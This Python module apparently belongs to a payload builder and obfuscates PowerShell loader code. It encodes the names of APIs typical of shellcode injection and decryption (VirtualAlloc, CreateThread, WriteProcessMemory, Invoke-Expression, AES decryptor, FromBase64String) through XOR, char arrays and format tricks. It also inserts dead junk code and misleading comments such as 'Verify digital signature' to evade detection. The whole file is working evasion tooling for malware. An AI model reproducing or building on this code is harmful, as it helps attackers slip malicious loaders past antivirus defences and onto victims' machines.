import random
import string
from utils import rand_var, rand_str


def obfuscate_string(s):
    method = random.choice(["char_concat", "char_array", "xor", "format", "replace"])
    if method == "char_concat":
        return _char_concat(s)
    elif method == "char_array":
        return _char_array(s)
    elif method == "xor":
        return _xor_string(s)
    elif method == "format":
        return _format_string(s)
    elif method == "replace":
        return _replace_string(s)


def _char_concat(s):
    parts = [f"[char]{ord(c)}" for c in s]
    return "(" + "+".join(parts) + ")"


def _char_array(s):
    chars = ",".join(str(ord(c)) for c in s)
    return f"(-join[char[]]({chars}))"


def _xor_string(s):
    key = random.randint(1, 255)
    xored = [ord(c) ^ key for c in s]
    arr = ",".join(str(b) for b in xored)
    return f"(-join(@({arr})|%{{[char]($_-bxor {key})}}))"


def _format_string(s):
    if len(s) < 2:
        return _char_concat(s)
    chunks = []
    i = 0
    while i < len(s):
        chunk_len = random.randint(1, max(1, min(4, len(s) - i)))
        chunks.append(s[i:i + chunk_len])
        i += chunk_len
    indices = list(range(len(chunks)))
    fmt = "".join(f"{{{idx}}}" for idx in indices)
    args = ",".join(f"'{c}'" for c in chunks)
    return f"('{fmt}'-f {args})"


def _replace_string(s):
    if len(s) < 3:
        return _char_concat(s)
    placeholder = None
    for c in "~`!@#^&*=|":
        if c not in s:
            placeholder = c
            break
    if not placeholder:
        return _char_concat(s)
    result = list(s)
    insert_count = random.randint(2, 5)
    for _ in range(insert_count):
        pos = random.randint(0, len(result))
        result.insert(pos, placeholder)
    mangled = "".join(result)
    return f"('{mangled}'.Replace('{placeholder}',''))"


def obfuscate_ps_strings(ps_code):
    targets = [
        "System.Security.Cryptography.AesManaged",
        "System.IO.Compression.GZipStream",
        "System.IO.Compression.CompressionMode",
        "System.IO.MemoryStream",
        "System.Text.Encoding",
        "System.Runtime.InteropServices.Marshal",
        "FromBase64String",
        "TransformFinalBlock",
        "CreateDecryptor",
        "Invoke-Expression",
        "VirtualAlloc",
        "CreateThread",
        "WaitForSingleObject",
        "VirtualProtect",
        "WriteProcessMemory",
        "kernel32",
        "ntdll.dll",
        "Start-Process",
        "WindowStyle",
        "Remove-Item",
    ]
    for target in targets:
        if target in ps_code:
            obf = obfuscate_string(target)
            ps_code = ps_code.replace(f"'{target}'", obf, 1)
            ps_code = ps_code.replace(f'"{target}"', obf, 1)
    return ps_code


def _junk_assignment():
    v = rand_var()
    val_type = random.choice(["int", "string", "array", "bool", "null"])
    if val_type == "int":
        return f"{v}={random.randint(0, 99999)}"
    elif val_type == "string":
        s = rand_str(random.randint(4, 16))
        return f'{v}="{s}"'
    elif val_type == "array":
        nums = ",".join(str(random.randint(0, 255)) for _ in range(random.randint(2, 6)))
        return f"{v}=@({nums})"
    elif val_type == "bool":
        return f"{v}=${random.choice(['true', 'false'])}"
    else:
        return f"{v}=$null"


def _junk_if_block():
    v1 = rand_var()
    v2 = rand_var()
    inner = random.choice([
        f'{v1}=[System.Environment]::TickCount;{v2}={v1}+1',
        f'{v1}=Get-Date;{v2}={v1}.Ticks',
        f'{v1}=[System.IO.Path]::GetTempPath();{v2}={v1}+"test"',
        f'{v1}=@(1,2,3);{v2}={v1}.Length',
        f'{v1}=[System.Guid]::NewGuid().ToString()',
    ])
    condition = random.choice([
        "$false",
        f"({random.randint(1,100)} -gt {random.randint(200,500)})",
        f"('{rand_str(4)}' -eq '{rand_str(4)}')",
    ])
    return f"if({condition}){{{inner}}}"


def _junk_loop():
    v = rand_var()
    count = random.randint(0, 0)
    return f"for({v}=0;{v} -lt {count};{v}++){{{_junk_assignment()}}}"


def _junk_try_catch():
    v = rand_var()
    return f"try{{{_junk_assignment()}}}catch{{{v}=$_.Exception.Message}}"


def _junk_comment():
    comments = [
        "# Initialize runtime configuration",
        "# Check system compatibility",
        "# Load required modules",
        "# Validate input parameters",
        "# Setup security context",
        "# Configure network adapter settings",
        "# Pre-allocate memory buffers",
        "# Synchronize thread state",
        "# Update service configuration",
        "# Register event handlers",
        "# Cleanup temporary resources",
        "# Verify digital signature",
    ]
    return random.choice(comments)


def generate_junk_block():
    generators = [
        _junk_assignment,
        _junk_if_block,
        _junk_loop,
        _junk_try_catch,
        _junk_comment,
    ]
    count = random.randint(1, 3)
    lines = [random.choice(generators)() for _ in range(count)]
    return "\n".join(lines)


def inject_junk(ps_code, density=0.3):
    lines = ps_code.split("\n")
    result = []
    in_herestring = False
    for line in lines:
        result.append(line)
        stripped = line.strip()
        if stripped.endswith('@"') or stripped == '@"':
            in_herestring = True
            continue
        if stripped.startswith('"@') or stripped == '"@':
            in_herestring = False
            continue
        if in_herestring:
            continue
        if (stripped and
            not stripped.startswith("using ") and
            not stripped.startswith("using(") and
            not stripped.startswith("public ") and
            not stripped.startswith("[DllImport") and
            not stripped.startswith("return ") and
            not stripped.endswith('{') and
            not stripped.endswith('}') and
            random.random() < density):
            result.append(generate_junk_block())
    return "\n".join(result)


def obfuscate(ps_code, string_obf=True, junk_inject=True, junk_density=0.25):
    if string_obf:
        ps_code = obfuscate_ps_strings(ps_code)
    if junk_inject:
        ps_code = inject_junk(ps_code, density=junk_density)
    return ps_code
